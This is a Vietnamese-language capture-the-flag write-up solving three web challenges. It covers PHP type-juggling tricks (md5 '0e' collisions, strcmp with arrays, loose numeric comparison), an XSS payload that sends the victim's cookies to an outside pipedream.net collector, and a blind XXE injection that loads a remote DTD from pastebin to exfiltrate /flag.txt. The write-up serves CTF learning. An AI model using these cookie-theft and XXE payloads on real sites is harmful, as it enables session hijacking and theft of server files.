# WEB

## Phpri Phprai

Đề bài: http://47.254.251.2:8889

Source code: 
```
<?php
    include 'config.php';
    show_source("index.php");
    error_reporting(0);
    if(isset($_GET["1"]) && isset($_GET["2"])) {
        $str1 = $_GET["1"];
        $str2 = $_GET["2"];
        if(($str1 !== $str2) && (md5($str1) == md5($str2))) {
            echo $flag1;
        }
    }
    if(isset($_GET["3"])) {
        if( strcmp( $_GET['3'], $$flag ) == 0) {
            echo $flag2;
        }
    }
    if(isset($_GET["4"])) {
        $str4 = $_GET["4"];
        $str4=trim($str4);
        if($str4 == '1.4e5' && $str4 !== '1.4e5') {
            echo $flag3;
        }
    }
    if(isset($_GET["5"])) {
        $str5 = $_GET["5"];
        if($str5 == 69 && $str5 !== '69' && $str5 !== 69 && strlen(trim($str5)) == 2) {
            echo $flag4;
        }
    }
    if(isset($_GET["6"])) {
        $str6 = $_GET["6"];
        $var1 = 'KaCeEtCe';
        $var2 = preg_replace("/$var1/", '', $str6);
        if($var1 === $var2) {
            echo $flag5;
        }
    }
?>
```

Flag được chia thành 5 phần:

**Flag1**: Ta cần tìm 2 chuỗi giá trị khác nhau nhưng hash md5 bằng nhau. 

Ở đây ta có 2 cách: 

Cách 1 là nhập vào 2 mảng: 1[] = a và 2[] = b sao cho a và b là 2 giá trị khác nhau. Khi đó nó trở thành: $_GET["1"] = array([0] => a) và $_GET["2"] = array([0] => b), khi hash md5 1 array thì kết quả trả về Null, nên so sánh 2 giá trị hash là bằng nhau. 

Cách 2 là search google với keyword md5 hash collision và tìm thấy 2 chuỗi `240610708` và `QNKCDZO` cho ra giá trị băm md5 được so sánh == là giống nhau. Do khi hash md5 2 giá trị này nó ra dạng 0e..., chúng cùng = int(0) nên với so sánh lỏng lẻo (==) thì 2 giá trị này bằng nhau. 

=> Payload1: http://47.254.251.2:8889/?1=240610708&2=QNKCDZO

Nhận được Flag1: `KCSC{B0_u_Bu_S4`

**Flag2**: Ta cần tìm 1 chuỗi sao cho so sánh (strcmp()) với $flag là giống nhau
Flag chỉ gồm 5 phần từ $flag1-5 nên $flag khả năng mang giá trị rỗng, nên mình thử nhập ?3='' thì ra luôn flag2. Ngoài ra, ta có thể dùng nhập mảng rỗng hoặc không nhập gì cũng cho ra flag2. 

=> Payload2: http://47.254.251.2:8889/?3[]=''

Nhận được Flag2: `C_8usssssss_htt`

**Flag3**: Ta cần tìm chuỗi sao cho khác 1.4e5 nhưng so sánh lỏng lẻo (==) thì bằng 1.4e5

Ở đây 1.4e5 = 1.4*10^5 nên ta có thể thay thành 0.14e6, 14e4, 140e3, 1400e2,... đều ra được flag3.

=> Payload3: http://47.254.251.2:8889/?4=14e4

Nhận được Flag3: `ps://www.youtub`

**Flag4**: Tương tự flag trước, ta cần tìm 1 chuỗi sao cho khác 69 nhưng so sánh lỏng lẻo (==) thì bằng 69 và độ dài chuỗi sau khi loại bỏ ký tự space trái phải bằng 2.

Ta nhập thêm 1 ký tự space vào trước 69 và URL Encode thành %2069 là thỏa mãn yêu cầu

=> Payload4: http://47.254.251.2:8889/?5=%2069

Nhận được Flag4: `e.com/watch?v=x`

**Flag5**: Cần tìm 1 chuỗi sao cho khi preg_replace đi 1 lần KaCeEtCe thì vẫn so sánh bằng tuyệt đối với KaCeEtCe.

Vậy ta chỉ cần chèn KaCeEtCe vào giữa KaCeEtCe là được chuỗi cần tìm

=> Payload5: http://47.254.251.2:8889/?6=KaCeKaCeEtCeEtCe

Nhận được Flag5: `QtC3F8fH6g}`

Payload hoàn chỉnh là: http://47.254.251.2:8889/?1=240610708&2=QNKCDZO&3[]=''&4=14e4&5=%2069&6=KaCeKaCeEtCeEtCe

Flag: `KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}`


**2 bài bên dưới mình chưa solve được trong thời gian diễn ra do mình chưa biết đến RequestBin của Pipedream để thu thập các request trên webhook và mình mới tìm hiểu về web exploitation khoảng vài tháng gần đây. Tuy nhiên mình biết đúng payload để exploit và sau khi kết thúc giải, mình xem writeup của 1 số bạn và hoàn thành 2 chall này =((**

## Hi Hi Hi

Đề bài: http://146.190.115.228:20109/

Web có chức năng nhập vào 1 message lời chúc và hiển thị message đó lên trang web. Bên dưới là chức năng gửi report tới localhost của Webserver. 

![image](https://user-images.githubusercontent.com/80137840/213621541-2e31e7bc-eaa7-45c8-ac11-e187636f29b8.png)

Khả năng web bị dính XSS. Thử nhập 'abc' ta thấy message được hiển thị trong thẻ div

![image](https://user-images.githubusercontent.com/80137840/213621798-cc399b9b-cc64-482e-831b-5625caba4fa7.png)

Thử 1 số payload XSS thì web bị XSS với payload đơn giản: `<svg onload=alert('XSS')>`

![image](https://user-images.githubusercontent.com/80137840/213622177-11686f14-2bb1-4d60-8294-fc1cd46bae82.png)

Khai thác XSS lấy cookie bằng cách gửi message report tới Server với payload như sau:

`http://127.0.0.1:13337/?message=<svg%20onload="window.location=%27https://eolqec95un0vjzg.m.pipedream.net/?cookie=%27%2B(document.cookie)">`

![image](https://user-images.githubusercontent.com/80137840/213625305-3fd8f1dc-9520-47a9-8ef0-5df99b9644bd.png)
    
Và nhận được flag:

![image](https://user-images.githubusercontent.com/80137840/213625487-a173ebe1-2f87-4566-8f4f-cb989c99a5e8.png)

Flag: `KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}`
    
    

## XXD

Đề bài: http://146.190.115.228:13373/

Bài này cho 1 form nhập thông tin và Submit

![image](https://user-images.githubusercontent.com/80137840/213668883-c8f23281-cc5b-45cd-ac0a-a735ac4c7531.png)

Thử nhập thông tin và kiểm tra request submit

![image](https://user-images.githubusercontent.com/80137840/213671848-f3b11c8d-224e-4d05-8a45-37299b768a52.png)

Thông tin được gửi đi dưới dạng XML nên khả năng là lỗi XXE. Ngoài ra, response trả về có status = 1 nên đây là blind XXE.

Sau khi thử 1 vài payload trên [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) thì mình thấy có 1 payload khai thác thành công là [XXE OOB with DTD and PHP filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter)

Tạo DTD trên pastebin với flag location là /flag.txt: [maliciousDTD](https://pastebin.com/raw/wUE4Wbyb)

![image](https://user-images.githubusercontent.com/80137840/213678940-a304069f-2215-4c27-b1f6-c7c88a5882d2.png)

Inject đoạn XML vào request gửi lên Server:

```
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "https://pastebin.com/raw/wUE4Wbyb">
%sp;
%param1;
]>
<r>&exfil;</r>
```

![image](https://user-images.githubusercontent.com/80137840/213679485-4bf7c812-f132-42c1-a8db-aed83a167b0a.png)

Và nhận được nội dung file /flag.txt

![image](https://user-images.githubusercontent.com/80137840/213679703-e43d62f7-442f-4ffe-9889-08eeaac4b31d.png)

Decode base64 ta nhận được flag:

![image](https://user-images.githubusercontent.com/80137840/213679811-7b8587dd-8c4c-43b2-993a-7bf987ac401d.png)

Flag: `KCSC{blind_xxD_xxO_xx]_xxe!!@#@}`
